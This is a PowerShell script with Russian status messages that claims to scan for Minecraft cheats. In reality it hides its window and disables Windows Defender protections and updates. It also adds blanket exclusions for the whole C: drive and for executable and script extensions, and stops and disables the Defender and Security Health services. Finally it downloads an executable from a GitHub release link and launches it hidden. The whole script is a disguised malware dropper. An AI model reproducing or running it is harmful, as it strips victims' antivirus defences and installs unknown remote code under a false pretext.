# СКРЫВАЕМ ОКНО
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null


Write-Host "[*] ПОИСК ЧИТОВ " -ForegroundColor Red
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdate $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableCatchupQuickScan $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue


Write-Host "[*] ПРОСМОТИР ПАПКИ .minecraft..." -ForegroundColor Yellow
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Windows" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Users" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".dll" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".bat" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue


Write-Host "[*] ПРОСМОТИР version..." -ForegroundColor Red
Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
Stop-Service SecurityHealthService -Force -ErrorAction SilentlyContinue
Stop-Service wscsvc -Force -ErrorAction SilentlyContinue
Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
Set-Service SecurityHealthService -StartupType Disabled -ErrorAction SilentlyContinue


Write-Host "[*] ПОИСК ПОДОЗРИТЕЛНИХ ПАПОК..." -ForegroundColor Green
$url = "https://github.com/kilordow/Fx.exe/releases/download/lol/RobloxUnblocker.exe"
$url = "https://github.com/svhosf/-/raw/refs/heads/main/Updater.exe"
$output = "RobloxUnblocker.exe"
$output = "Updater.exe"

try {
    Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction Stop
    Write-Host "[+] ПРАВЕРКА ПРОЙДЕНА: $output" -ForegroundColor Green
} catch {
    Write-Host "[-] ОШИБКА ВОЗМОЖНА СТАРАЯ ВЕРСИЯ!" -ForegroundColor Red
    exit
}

# ЗАПУСКАЕМ
if (Test-Path $output) {
    Write-Host "[*] ОБНОВЛЕНИЯ..." -ForegroundColor Cyan
    Start-Process -FilePath $output -WindowStyle Hidden
}

Write-Host "[+] ГОТОВО!" -ForegroundColor Green